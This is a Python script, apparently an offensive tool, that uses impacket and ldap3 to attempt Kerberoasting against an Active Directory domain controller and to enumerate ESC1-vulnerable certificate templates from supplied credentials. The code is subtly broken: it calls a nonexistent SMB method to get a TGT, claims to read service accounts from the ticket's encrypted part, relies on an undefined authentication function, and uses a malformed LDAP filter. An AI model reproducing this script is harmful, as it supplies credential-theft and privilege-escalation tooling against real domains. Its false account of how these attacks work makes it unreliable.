from impacket.smbconnection import SMBConnection
from impacket.krb5.asn1 import TGS_REP, Authenticator, AP_REQ, EncAPRepPart
from impacket.krb5 import constants
import dns.resolver
import ldap3
from impacket.krb5 import constants
from impacket.krb5.asn1 import AP_REQ, TGS_REQ
from impacket.krb5.types import Principal, KerberosTime, Ticket
from impacket.ntlm import compute_lmhash, compute_nthash

def get_ticket_for_user(username, password, domain, dc_ip):
    # Connect to the Domain Controller via SMB
    smb = SMBConnection(dc_ip, dc_ip)
    smb.login(username, password, domain)

    # Get the TGT for the specified user
    _, krbtgt_ticket = smb.getKerberosTGT(username, password, domain)
    smb.logoff()

    return krbtgt_ticket

def kerberoast(domain, username, password, dc_ip):
    try:
        print(f"Attempting to Kerberoast accounts from {dc_ip}")

        # Get TGT ticket for the specified user
        krbtgt_ticket = get_ticket_for_user(username, password, domain, dc_ip)

        if krbtgt_ticket:
            print("Successfully obtained krbtgt ticket.")
            
            # Extract usernames of kerberoastable accounts from the TGT
            kerberoastable_accounts = extract_kerberoastable_accounts(krbtgt_ticket)
            if kerberoastable_accounts:
                print("Kerberoastable Accounts:")
                for account in kerberoastable_accounts:
                    print(account)
            else:
                print("No kerberoastable accounts found.")
        else:
            print("Failed to obtain krbtgt ticket.")

    except Exception as e:
        print(f"Error while Kerberoasting: {e}")

def extract_kerberoastable_accounts(tgt):
    try:
        kerberoastable_accounts = []

        for ticket in tgt['enc-part']['cipher'].tickets:
            sname = str(ticket['sname'])
            if sname.startswith('service'):
                service_name = sname.split('/')[1].split('@')[0]
                kerberoastable_accounts.append(service_name)

        return kerberoastable_accounts

    except Exception as e:
        print(f"Error while extracting kerberoastable accounts: {e}")
        return []

def find_esc1_certificate_templates(username, password, domain, dc_ip):
    try:
        conn = kerberos_auth(username, password, domain, dc_ip)
        if conn:
            print(f"Searching for ESC1 certificate templates on {dc_ip}")

            search_base = 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,' + ','.join(f"DC={dc}" for dc in domain.split('.'))
            search_filter = '(&(objectClass=pKICertificateTemplate)(!(name=DomainControllerAuthentication))(objectCategory=CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration)(msPKI-Certificate-Template-OID=1.3.6.1.4.1.311.21.8.11141852.2904762.4056951.8883555.2409484.547.1.2))'
            attributes = ['displayName']
            
            conn.search(search_base=search_base,
                        search_filter=search_filter,
                        search_scope=ldap3.SUBTREE,
                        attributes=attributes)

            if conn.entries:
                print(f"ESC1 certificate templates found on {dc_ip} that meet the criteria:")
                for entry in conn.entries:
                    print(entry.displayName.value)
            else:
                print(f"No ESC1 certificate templates found on {dc_ip}.")

    except Exception as e:
        print(f"Error while searching for ESC1 certificate templates: {e}")


# Example usage:
username = input("Enter username: ")
password = input("Enter password: ")
domain = input("Enter domain: ")
dc_ip = input("Enter domain controller IP or hostname: ")

kerberoast(domain, username, password, dc_ip)
find_esc1_certificate_templates(username, password, domain, dc_ip)
